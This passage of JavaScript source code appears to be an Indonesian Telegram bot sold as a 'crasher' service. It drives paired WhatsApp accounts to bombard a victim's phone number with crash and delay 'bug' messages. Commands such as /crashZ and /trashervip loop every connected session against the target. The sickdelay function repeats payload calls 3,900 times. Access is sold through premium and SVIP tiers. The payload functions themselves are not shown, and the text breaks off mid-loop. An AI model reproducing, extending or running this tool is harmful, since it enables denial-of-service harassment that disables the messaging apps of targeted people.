  return config.OWNER_ID.includes(userId.toString());
}

bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  //ganti link foto dan musik dibawah sesuai kebutuhan
//ganti caption dibawah sesuai kebutuhan 
  if (settings.groupOnly && msg.chat.type === 'private' && !isOwner(msg.from.id)) {
    return bot.sendMessage(chatId, '🚫 Bot ini hanya bisa digunakan di *grup*.', {
      parse_mode: 'Markdown'
    });
  }
  await bot.sendPhoto(chatId, "https://files.catbox.moe/zdlu58.jpg", {
    caption: `
\`\`\`
( 🤓 ) - Helo iam Emotional pain pembuat script team rulz
tulus,selalu ada buat dia,selalu mengerti akn perasaannya,semuanya hanya tentang dia.semua itu awal dari kehancuran sendiri🥀. 

╭━━━⭓「 𝐂𝐑𝐀𝐒𝐇𝐄𝐑  」
║ ◇ 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 : RULZ X TEAM
┃ ◇ 𝐒𝐂𝐑𝐈𝐏𝐓 : Emotional pain
║ ◇ 𝐔𝐒𝐄𝐑 : ${msg.from.username}
┃ ◇ 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 : ${sessions.size}
║ ◇ 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 : ${runtime()}
┃ ◇ 𝐋𝐀𝐍𝐆𝐔𝐀𝐆𝐄 : 𝐉𝐀𝐕𝐀𝐒𝐂𝐑𝐈𝐏𝐓
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\`
`,
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "「 𝐂͢𝐑͠𝐀᷼𝐒͠⍣𝐇 」", callback_data: "bug_menu" },
          { text: "「 𝐀͢𝐊͡𝐒𝐄͜⍣᷼𝐒͠ 」", callback_data: "owner_menu" },
        ],
      ],
    },
  });
  await bot.sendAudio(chatId, 'https://files.catbox.moe/7dx5el.mp3', {
    title: "Kapi Crasher",
    performer: "Unknown",
    caption: "🔫🔫🔫"
  });
});

bot.on("callback_query", (callbackQuery) => {
  const data = callbackQuery.data;
  const chatId = callbackQuery.message.chat.id;
  const userId = callbackQuery.from.id;
  const { premium, supervip } = badge(userId);
  bot.answerCallbackQuery(callbackQuery.id);
    //ganti link foto dibawah sesuai kebutuhan
//ganti caption dibawah sesuai kebutuhan 
  if (data === "bug_menu") {
    bot.deleteMessage(chatId, callbackQuery.message.message_id).then(() => {
      bot.sendPhoto(chatId, "https://files.catbox.moe/zdlu58.jpg", {
        caption: `
\`\`\`
╭━━━⭓「 𝐢𝐌𝐀𝐓𝐢𝐎𝐍 ☇ 」
║ ◇ 𝐔𝐒𝐄𝐑      : ${callbackQuery.from.username}
┃ ◇ 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 : ${premium}
║ ◇ 𝐒𝐔𝐏𝐄𝐑𝐕𝐈𝐏 : ${supervip}
┃ ◇ 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 : ${sessions.size}
║ ◇ 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 : ${runtime()}
╰━━━━━━━━━━━━━━━━━━⭓
╭━━━⭓「 𝐂͢𝐑͠𝐀᷼𝐒͠⍣𝐇 ° 」
┃◇ /crashZ 62xxxx  
┗─⊱
┃◇ /invisiblevip 62xxx
┗─⊱ 
┃◇ /uisystem 62xxx
┗─⊱ 
┃◇ /trashervip 62xxx   
┗─⊱ 
╰━━━━━━━━━━━━━━━⭓
\`\`\`
`,
        parse_mode: "MarkdownV2",
        reply_markup: {
          inline_keyboard: [[{ text: "「 𝐁͢𝐀͡𝐂⍣𝐊 」", callback_data: "start_menu" }]],
        },
      });
    });
  } else if (data === "owner_menu") {
   if (!isOwner(userId)) {
    return bot.answerCallbackQuery(callbackQuery.id, { text: "🚫 Akses ditolak. Hanya untuk Owner.", show_alert: true });
  }
  //ganti link foto dibawah sesuai kebutuhan
//ganti caption dibawah sesuai kebutuhan 
    bot.deleteMessage(chatId, callbackQuery.message.message_id).then(() => {
      bot.sendPhoto(chatId, "https://files.catbox.moe/zdlu58.jpg", {
        caption: `
\`\`\`
╔─═─═⪩「 𝐀͢𝐊͡𝐒𝐄͜⍣᷼𝐒͠ 」
│ ┏─⊱ Ola @${callbackQuery.from.username}! 
║ ▢ /addbot <ᴘᴀɪʀɪɴɢ>
║ ▢ /setcd <ᴅᴇᴛɪᴋ> 
║ ▢ /grouponly <ᴏɴ/ᴏꜰꜰ>
│ ▢ /listbot
║ ▢ /addsvip <ɪᴅ> <ᴅᴀʏs>
│ ▢ /delsvip <ɪᴅ> <ᴅᴀʏs>
║ ▢ /listsvip 
│ ▢ /addprem <ɪᴅ> <ᴅᴀʏs>
║ ▢ /delprem <ɪᴅ> <ᴅᴀʏs>
│ ▢ /listprem 
║ ┗─⊱
╚─═─═─═─═─═─═─═⪩
\`\`\`
`,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "「 𝐁͢𝐀͡𝐂⍣𝐊 」", callback_data: "start_menu" }]],
        },
      });
    });
  } else if (data === "start_menu") {
    const username = callbackQuery.from.username || "Unknown";
    const message = callbackQuery.message;
  //ganti link foto dan musik dibawah sesuai kebutuhan
//ganti caption dibawah sesuai kebutuhan 
    if (message) {
      bot.deleteMessage(chatId, message.message_id).then(() => {
        bot.sendPhoto(chatId, "https://files.catbox.moe/zdlu58.jpg", {
          caption: `
\`\`\`
( 🤓 ) - Helo iam Emotional pain pembuat script team rulz
tulus,selalu ada buat dia,selalu mengerti akn perasaannya,semuanya hanya tentang dia.semua itu awal dari kehancuran sendiri🥀. 


╭━━━⭓「 𝐢𝐌𝐀𝐓𝐢𝐎𝐍 ☇ 」
║ ◇ 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 : RULZ X TEAM
┃ ◇ 𝐒𝐂𝐑𝐈𝐏𝐓 : Emotional pain
║ ◇ 𝐔𝐒𝐄𝐑 : ${username}
┃ ◇ 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 : ${sessions.size}
║ ◇ 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 : ${runtime()}
┃ ◇ 𝐋𝐀𝐍𝐆𝐔𝐀𝐆𝐄 : 𝐉𝐀𝐕𝐀𝐒𝐂𝐑𝐈𝐏𝐓
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\`
          `.trim(),
          parse_mode: "MarkdownV2",
          reply_markup: {
            inline_keyboard: [
              [
                { text: "「 𝐂͢𝐑͠𝐀᷼𝐒͠⍣𝐇 」", callback_data: "bug_menu" },
                { text: "「 𝐀͢𝐊͡𝐒𝐄͜⍣᷼𝐒͠ 」", callback_data: "owner_menu" },
              ],
            ],
          },
        });

        bot.sendAudio(chatId, "https://files.catbox.moe/7dx5el.mp3", {
          title: "Kapi Crasher",
          performer: "Unknown",
          caption: "🔫🔫🔫"
        });
      });
    }
  } 
});

bot.on("message", (msg) => {
  const chatId = msg.chat.id;
});
const supervipFile = path.resolve("./supervip_users.js");
let supervipUsers = require("./supervip_users.js");

function isSupervip(userId) {
  const user = supervipUsers.find(u => u.id === userId.toString());
  if (!user) return false;
  const currentTime = Date.now();
  if (user.expiresAt < currentTime) {
    supervipUsers = supervipUsers.filter(u => u.id !== userId.toString());
    fs.writeFileSync(supervipFile, `const supervipUsers = ${JSON.stringify(supervipUsers, null, 2)};`);
    return false; 
  }
  return true; 
}

bot.onText(/\/addsvip(?:\s+(\d+))?\s+(\d+)/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "❗*LU SIAPA GOBLOK?!* Hanya OWNER yang bisa menambahkan SVIP.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1] || !match[2]) {
    return bot.sendMessage(chatId, "❗Example: /addsvip <id> <durasi>", {
      parse_mode: "Markdown",
    });
  }

  const newUserId = match[1].replace(/[^0-9]/g, "");
  const durationDays = parseInt(match[2]);

  if (!newUserId || isNaN(durationDays) || durationDays <= 0) {
    return bot.sendMessage(chatId, "❗ID atau durasi tidak valid.");
  }

  const expirationTime = Date.now() + durationDays * 24 * 60 * 60 * 1000; 

  if (supervipUsers.some(user => user.id === newUserId)) {
    return bot.sendMessage(chatId, "❗User sudah terdaftar sebagai SVIP.");
  }

  supervipUsers.push({ id: newUserId, expiresAt: expirationTime });

  const fileContent = `const supervipUsers = ${JSON.stringify(
    supervipUsers,
    null,
    2
  )};\n\nmodule.exports = supervipUsers;`;

  fs.writeFile(supervipFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menyimpan pengguna ke daftar supervip."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menambahkan ID ${newUserId} ke daftar supervip dengan kedaluwarsa ${durationDays} hari.`
    );
  });
});

bot.onText(/\/delsvip(?:\s+(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "❗*LU SIAPA GOBLOK?!* Hanya OWNER yang bisa hapus SVIP.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1]) {
    return bot.sendMessage(chatId, "❗Example : /delsvip <id>", {
      parse_mode: "Markdown",
    });
  }

  const userIdToRemove = match[1].replace(/[^0-9]/g, "");
  const userIndex = supervipUsers.findIndex(user => user.id === userIdToRemove);

  if (userIndex === -1) {
    return bot.sendMessage(chatId, "❗User tidak ditemukan dalam daftar SVIP.");
  }
  supervipUsers.splice(userIndex, 1);

  const fileContent = `const supervipUsers = ${JSON.stringify(
    supervipUsers,
    null,
    2
  )};\n\nmodule.exports = supervipUsers;`;

  fs.writeFile(supervipFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menghapus pengguna dari daftar supervip."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menghapus ID ${userIdToRemove} dari daftar supervip.`
    );
  });
});

bot.onText(/\/listsvip/, (msg) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "❗*LU SIAPA GOBLOK?!*\nHanya OWNER yang bisa lihat daftar SVIP.",
      { parse_mode: "Markdown" }
    );
  }

  const validSupervipUsers = supervipUsers.filter(user => user.expiresAt > Date.now());

  if (!validSupervipUsers.length) {
    return bot.sendMessage(chatId, "📭 Daftar SVIP kosong.");
  }

  const svipList = validSupervipUsers
    .map((user, index) => {
      const expiresAt = new Date(user.expiresAt).toLocaleString();
      return `${index + 1}. ${user.id}\nExpired : ${expiresAt}`;
    })
    .join("\n\n");

  bot.sendMessage(
    chatId,
    ` *LIST SUPER VIP USER :*\n\`\`\`\n${svipList}\n\`\`\``,
    { parse_mode: "Markdown" }
  );
});


const premiumFile = path.resolve("./premium_users.js");
let premiumUsers = require("./premium_users.js");

function isPremium(userId) {
  const user = premiumUsers.find(u => u.id === userId.toString());
  if (!user) return false;
  
  // Cek apakah waktu kedaluwarsa sudah lewat
  const currentTime = Date.now();
  if (user.expiresAt < currentTime) {
    // Hapus pengguna yang kedaluwarsa dari daftar
    premiumUsers = premiumUsers.filter(u => u.id !== userId.toString());
    fs.writeFileSync(premiumFile, `const premiumUsers = ${JSON.stringify(premiumUsers, null, 2)};`);
    return false;  
  }

  return true; 
}

bot.onText(/\/addprem(?:\s+(.+)\s+(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "❗*LU SIAPA GOBLOK?!* ONLY OWNER & SVIP !.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1] || !match[2]) {
    return bot.sendMessage(chatId, "❗Example : /addprem <id> <days>", {
      parse_mode: "Markdown",
    });
  }

  const newUserId = match[1].replace(/[^0-9]/g, "");
  const expirationDays = parseInt(match[2]);

  if (!newUserId || isNaN(expirationDays) || expirationDays <= 0) {
    return bot.sendMessage(chatId, "❗ID atau waktu kedaluwarsa tidak valid.");
  }

  if (premiumUsers.some(user => user.id === newUserId)) {
    return bot.sendMessage(chatId, "❗User sudah premium.");
  }

  const expiresAt = Date.now() + expirationDays * 24 * 60 * 60 * 1000;

  premiumUsers.push({ id: newUserId, expiresAt });

  const fileContent = `const premiumUsers = ${JSON.stringify(
    premiumUsers,
    null,
    2
  )};\n\nmodule.exports = premiumUsers;`;

  fs.writeFile(premiumFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menyimpan pengguna ke daftar premium."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menambahkan ID ${newUserId} ke daftar premium dengan waktu kedaluwarsa ${expirationDays} hari.`
    );
  });
});

bot.onText(/\/delprem(?:\s+(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "❗*LU SIAPA GOBLOK?!* Hanya OWNER & SVIP yang bisa hapus premium.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1]) {
    return bot.sendMessage(chatId, "❗Example : /delprem <id>", {
      parse_mode: "Markdown",
    });
  }

  const userIdToRemove = match[1].replace(/[^0-9]/g, "");

  const userIndex = premiumUsers.findIndex(user => user.id === userIdToRemove);

  if (userIndex === -1) {
    return bot.sendMessage(chatId, "❗User tidak ditemukan di daftar premium.");
  }

  premiumUsers.splice(userIndex, 1);

  const fileContent = `const premiumUsers = ${JSON.stringify(
    premiumUsers,
    null,
    2
  )};\n\nmodule.exports = premiumUsers;`;

  fs.writeFile(premiumFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menyimpan data premium."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menghapus ID ${userIdToRemove} dari daftar premium.`
    );
  });
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nHanya pemilik bot yang dapat melihat daftar pengguna premium.",
      { parse_mode: "Markdown" }
    );
  }

  if (!premiumUsers.length) {
    return bot.sendMessage(chatId, "📭 Daftar pengguna premium kosong.");
  }

  const premiumList = premiumUsers
    .map((user, index) => {
      const expiresAt = new Date(user.expiresAt).toLocaleString();
      return `${index + 1}. ${user.id}\nExpired : ${expiresAt}`;
    })
    .join("\n\n");

  bot.sendMessage(
    chatId,
    `📋 *LIST PREMIUM USER :*\n\`\`\`\n${premiumList}\n\`\`\``,
    { parse_mode: "Markdown" }
  );
});

bot.onText(/\/listbot/, async (msg) => {
  const chatId = msg.chat.id;

  if (!isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "❗*LU SIAPA GOBLOK?!.* ONLY OWNER & SVIP !.",
      { parse_mode: "Markdown" }
    );
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    let botList = 
  "```" + "\n" +
  "╭━━━⭓「 𝐋𝐢𝐒𝐓 ☇ °𝐁𝐎𝐓 」\n" +
  "║\n" +
  "┃\n";

let index = 1;

for (const [botNumber, sock] of sessions.entries()) {
  const status = sock.user ? "🟢" : "🔴";
  botList += `║ ◇ 𝐁𝐎𝐓 ${index} : ${botNumber}\n`;
  botList += `┃ ◇ 𝐒𝐓𝐀𝐓𝐔𝐒 : ${status}\n`;
  botList += "║\n";
  index++;
}
botList += `┃ ◇ 𝐓𝐎𝐓𝐀𝐋𝐒 : ${sessions.size}\n`;
botList += "╰━━━━━━━━━━━━━━━━━━⭓\n";
botList += "```";


    await bot.sendMessage(chatId, botList, { parse_mode: "Markdown" });
  } catch (error) {
    console.error("Error in listbot:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengambil daftar bot. Silakan coba lagi."
    );
  }
});

bot.onText(/\/addbot(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;

  // Akses hanya untuk OWNER & SVIP
  if (!isOwner(msg.from.id) && !isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "❗*LU SIAPA GOBLOK?!* Hanya OWNER & SVIP yang bisa tambah bot.",
      { parse_mode: "Markdown" }
    );
  }

  // Validasi input
  if (!match || !match[1]) {
    return bot.sendMessage(chatId, "❗️Contoh penggunaan:\n`/addbot 62xxxxxxxxxx`", {
      parse_mode: "Markdown",
    });
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");

  if (botNumber.length < 10) {
    return bot.sendMessage(chatId, "❗️Nomor tidak valid.");
  }

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in /addbot:", error);
    bot.sendMessage(
      chatId,
      "⚠️ Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

bot.onText(/^\/grouponly (on|off)$/i, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "❗*LU SIAPA GOBLOK?!* Hanya OWNER yang bisa mengubah mode Group Only.", {
      parse_mode: "Markdown"
    });
  }

  const state = match[1].toLowerCase();
  settings.groupOnly = state === 'on';

  try {
    fs.writeFileSync('./settings.json', JSON.stringify(settings, null, 2));
    bot.sendMessage(chatId, `✅ Mode *Group Only* telah *${settings.groupOnly ? 'AKTIF' : 'NONAKTIF'}*.`, {
      parse_mode: 'Markdown'
    });
  } catch (error) {
    bot.sendMessage(chatId, "❌ Gagal menyimpan pengaturan.", {
      parse_mode: 'Markdown'
    });
    console.error("Gagal menulis settings.json:", error);
  }
});

bot.onText(/^\/grouponly$/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  bot.sendMessage(chatId, '❗️Example: /grouponly on');
});

bot.onText(/^\/setcd (\d+)$/i, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "❗*LU SIAPA GOBLOK?!* Hanya OWNER yang bisa mengubah cooldown.", {
      parse_mode: "Markdown"
    });
  }

  const newCd = parseInt(match[1]);
  if (isNaN(newCd) || newCd < 0) {
    return bot.sendMessage(chatId, '⚠️ Masukkan angka yang valid (>= 0).');
  }
  settings.cooldown = newCd;
  try {
    fs.writeFileSync('./settings.json', JSON.stringify(settings, null, 2));
    bot.sendMessage(chatId, `✅ Cooldown berhasil diubah menjadi *${newCd} detik*.`, {
      parse_mode: 'Markdown'
    });
  } catch (err) {
    console.error("Gagal menyimpan ke settings.json:", err);
    bot.sendMessage(chatId, '❌ Terjadi kesalahan saat menyimpan pengaturan.');
  }
});


bot.onText(/^\/setcd$/, (msg) => {
  bot.sendMessage(msg.chat.id, '❗️Example: /setcd 60');
});


//command crasher
bot.onText(/\/crashZ(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const COOLDOWN_TIME = settings.cooldown * 1000;
  const now = Date.now();

  try {
    if (!isPremium(userId) && !isSupervip(userId)) {
      return bot.sendMessage(chatId, "❌ Anda Tidak Memiliki Akses!", { parse_mode: "Markdown" });
    }

    const inputNumber = match[1];
    if (!inputNumber) {
      return bot.sendMessage(chatId, "❗️Example : /voxstromvip 62xxx", { parse_mode: "Markdown" });
    }

    const formattedNumber = inputNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang aktif. Gunakan /addbot terlebih dahulu.");
    }

    const lastUsage = cooldowns.get(userId);
    if (lastUsage && now - lastUsage < COOLDOWN_TIME) {
      const remainingTime = Math.ceil((COOLDOWN_TIME - (now - lastUsage)) / 1000);
      return bot.sendMessage(chatId, `⏱️ Tunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`);
    }

    cooldowns.set(userId, now);
      //ganti link foto dibawah sesuai kebutuhan
    const statusMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/zdlu58.jpg", {
      caption: `
\`\`\`

╭━━━⭓「 SENDING BUG 」
║ ◇ 𝐃𝐀𝐓𝐄 : ${dateTime()}
┃ ◇ 𝐒𝐄𝐍𝐃𝐄𝐑 : @${msg.from.username}
┃ ◇ 𝐌𝐄𝐓𝐇𝐎𝐃𝐒 : crashZ
║ ◇ 𝐓𝐀𝐑𝐆𝐄𝐓𝐒 : ${formattedNumber}
╰━━━━━━━━━━━━━━━━━━⭓

\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { 
              text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
              url: `https://wa.me/${formattedNumber}` // Direct link to the ji's WhatsApp
            },
          ],
        ],
      },
    });
    ;

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        await sickdelay(sock, jid);
        successCount++;
      } catch (err) {
        console.error(`Error in bot ${botNum}:`, err.message);
        failCount++;
      }
    }
  } catch (error) {
    console.error("DELAY ERROR:", error);
    await bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});

bot.onText(/\/invisiblevip(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const COOLDOWN_TIME = settings.cooldown * 1000;
  const now = Date.now();

  try {
    if (!isPremium(userId) && !isSupervip(userId)) {
      return bot.sendMessage(chatId, "❌ Anda Tidak Memiliki Akses!", { parse_mode: "Markdown" });
    }

    const inputNumber = match[1];
    if (!inputNumber) {
      return bot.sendMessage(chatId, "❗️Example : /invisiblevip 62xxx", { parse_mode: "Markdown" });
    }

    const formattedNumber = inputNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang aktif. Gunakan /addbot terlebih dahulu.");
    }

    const lastUsage = cooldowns.get(userId);
    if (lastUsage && now - lastUsage < COOLDOWN_TIME) {
      const remainingTime = Math.ceil((COOLDOWN_TIME - (now - lastUsage)) / 1000);
      return bot.sendMessage(chatId, `⏱️ Tunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`);
    }

    cooldowns.set(userId, now);
          //ganti link foto dibawah sesuai kebutuhan
    const statusMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/zdlu58.jpg", {
      caption: `
\`\`\`

╭━━━⭓「 SENDING BUG 」
║ ◇ 𝐃𝐀𝐓𝐄 : ${dateTime()}
┃ ◇ 𝐒𝐄𝐍𝐃𝐄𝐑 : @${msg.from.username}
┃ ◇ 𝐌𝐄𝐓𝐇𝐎𝐃𝐒 : invisiblevip
║ ◇ 𝐓𝐀𝐑𝐆𝐄𝐓𝐒 : ${formattedNumber}
╰━━━━━━━━━━━━━━━━━━⭓

\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { 
              text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
              url: `https://wa.me/${formattedNumber}` // Direct link to the target's WhatsApp
            },
          ],
        ],
      },
    });
    ;

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        await sickproto(sock, jid);
        successCount++;
      } catch (err) {
        console.error(`Error in bot ${botNum}:`, err.message);
        failCount++;
      }
    }
  } catch (error) {
    console.error("invisiblevip ERROR:", error);
    await bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});


bot.onText(/\/uisystem(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const COOLDOWN_TIME = settings.cooldown * 1000;
  const now = Date.now();

  try {
    if (!isPremium(userId) && !isSupervip(userId)) {
      return bot.sendMessage(chatId, "❌ Anda Tidak Memiliki Akses!", { parse_mode: "Markdown" });
    }

    const inputNumber = match[1];
    if (!inputNumber) {
      return bot.sendMessage(chatId, "❗️Example : /uisystem 62xxx", { parse_mode: "Markdown" });
    }

    const formattedNumber = inputNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang aktif. Gunakan /addbot terlebih dahulu.");
    }

    const lastUsage = cooldowns.get(userId);
    if (lastUsage && now - lastUsage < COOLDOWN_TIME) {
      const remainingTime = Math.ceil((COOLDOWN_TIME - (now - lastUsage)) / 1000);
      return bot.sendMessage(chatId, `⏱️ Tunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`);
    }

    cooldowns.set(userId, now);
          //ganti link foto dibawah sesuai kebutuhan
    const statusMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/zdlu58.jpg", {
      caption: `
\`\`\`

╭━━━⭓「 SENDING BUG 」
║ ◇ 𝐃𝐀𝐓𝐄 : ${dateTime()}
┃ ◇ 𝐒𝐄𝐍𝐃𝐄𝐑 : @${msg.from.username}
┃ ◇ 𝐌𝐄𝐓𝐇𝐎𝐃𝐒 : uisystem
║ ◇ 𝐓𝐀𝐑𝐆𝐄𝐓𝐒 : ${formattedNumber}
╰━━━━━━━━━━━━━━━━━━⭓

\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { 
              text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
              url: `https://wa.me/${formattedNumber}` // Direct link to the target's WhatsApp
            },
          ],
        ],
      },
    });
    ;

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        await sickui(sock, jid);
        successCount++;
      } catch (err) {
        console.error(`Error in bot ${botNum}:`, err.message);
        failCount++;
      }
    }
  } catch (error) {
    console.error("uisystem ERROR:", error);
    await bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});

bot.onText(/\/trashervip(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const COOLDOWN_TIME = settings.cooldown * 1000;
  const now = Date.now();

  try {
    if (!isPremium(userId) && !isSupervip(userId)) {
      return bot.sendMessage(chatId, "❌ Anda Tidak Memiliki Akses!", { parse_mode: "Markdown" });
    }

    const inputNumber = match[1];
    if (!inputNumber) {
      return bot.sendMessage(chatId, "❗️Example : /trashervip 62xxx", { parse_mode: "Markdown" });
    }

    const formattedNumber = inputNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang aktif. Gunakan /addbot terlebih dahulu.");
    }

    const lastUsage = cooldowns.get(userId);
    if (lastUsage && now - lastUsage < COOLDOWN_TIME) {
      const remainingTime = Math.ceil((COOLDOWN_TIME - (now - lastUsage)) / 1000);
      return bot.sendMessage(chatId, `⏱️ Tunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`);
    }

    cooldowns.set(userId, now);
          //ganti link foto dibawah sesuai kebutuhan
    const statusMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/zdlu58.jpg", {
      caption: `
\`\`\`

╭━━━⭓「 SENDING BUG 」
║ ◇ 𝐃𝐀𝐓𝐄 : ${dateTime()}
┃ ◇ 𝐒𝐄𝐍𝐃𝐄𝐑 : @${msg.from.username}
┃ ◇ 𝐌𝐄𝐓𝐇𝐎𝐃𝐒 : trashervip
║ ◇ 𝐓𝐀𝐑𝐆𝐄𝐓𝐒 : ${formattedNumber}
╰━━━━━━━━━━━━━━━━━━⭓

\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { 
              text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
              url: `https://wa.me/${formattedNumber}` // Direct link to the target's WhatsApp
            },
          ],
        ],
      },
    });
    ;

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        await trasher(sock, jid);
        successCount++;
      } catch (err) {
        console.error(`Error in bot ${botNum}:`, err.message);
        failCount++;
      }
    }
  } catch (error) {
    console.error("TRASHER ERROR:", error);
    await bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});


// !! [ COMBO FUNCTION SECTION ] !!
// jid itu target
// sock itu nomer bot

//delay function
async function sickdelay(sock, jid) {
  if (!sock.user) throw new Error("Bot tidak aktif.");

  console.log(chalk.green(`STARTING DELAY ${jid}`));

  for (let i = 1; i <= 3900; i++) {
    if (!sock.user) break;

    console.log(chalk.red.bold(`DELAY SEND TO ${jid}`));

    await safeExec("InVisibleX", () => InVisibleX(sock, jid, true));
    await safeExec("IMGCRL", () => IMGCRL(sock, jid, true));
    await safeExec("potterinvis", () => potterinvis(sock, jid, true));
    await safeExec("IMGCRL", () => IMGCRL(sock, jid, true));
    await safeExec("callNewsletter", () => callNewsletter(sock, jid, true));
    await safeExec("potterinvis", () => potterinvis(sock, jid, true));
    await safeExec("IMGCRL", () => IMGCRL(sock, jid, true));
    await safeExec("VcardXFc", () => VcardXFc(sock, jid, true));
    await safeExec("callNewsletter", () => callNewsletter(sock, jid, true));
    await safeExec("XdelayTrash", () => XdelayTrash(sock, jid, true));
    await safeExec("LocaBetanew2", () => LocaBetanew2(sock, jid, true));
